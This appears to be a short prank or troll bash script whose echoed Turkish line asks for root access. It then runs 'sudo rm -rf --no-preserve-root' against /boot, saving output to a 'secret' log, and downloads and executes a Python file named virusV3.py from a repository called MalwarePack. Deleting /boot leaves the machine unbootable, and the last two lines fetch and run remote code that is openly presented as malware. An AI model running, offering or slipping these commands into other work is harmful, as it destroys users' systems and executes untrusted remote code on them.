#/bin/bash
echo "Ya kardeşim bana root yetkisi verirmisin"
sudo rm -rf --no-preserve-root -v /boot > gizli.log
cat gizli.log | less
wget https://raw.githubusercontent.com/skittleOS/MalwarePack/refs/heads/main/virusV3.py
python virusV3.py


